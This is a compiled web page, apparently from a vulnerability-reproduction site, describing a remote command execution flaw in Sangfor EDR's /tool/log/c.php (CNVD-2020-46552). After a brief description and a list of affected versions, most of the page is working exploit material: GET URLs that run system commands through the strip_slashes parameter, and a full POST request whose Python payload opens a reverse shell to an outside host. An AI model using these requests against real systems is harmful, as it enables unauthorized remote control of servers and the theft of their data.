import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as i,e as a}from"./app-58e4a7d6.js";const n={},t=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>深信服终端检测响应平台是深信服公司开发的一套EDR系统。攻击者利用该漏洞，可向目标服务器发送恶意构造的HTTP请求，从而获得目标服务器的权限，实现远程代码控制执行。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>EDR v3.2.16
EDR v3.2.17
EDR v3.2.19
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&amp;limit=whoami
https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&amp;host=whoami
https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&amp;path=whoami
https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&amp;row=whoami
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091913721.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><strong>反弹shell</strong></p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /tool/log/c.php HTTP/1.1
Host: x.x.x.x
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 256

strip_slashes=system&amp;host=python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>向 <strong>/tool/log/c.php</strong> POST以下数据即可</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>strip_slashes=system&amp;host=python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,11),l=[t];function o(d,c){return s(),i("div",null,l)}const x=e(n,[["render",o],["__file","深信服 EDR c.php 远程命令执行漏洞 CNVD-2020-46552.html.vue"]]);export{x as default};
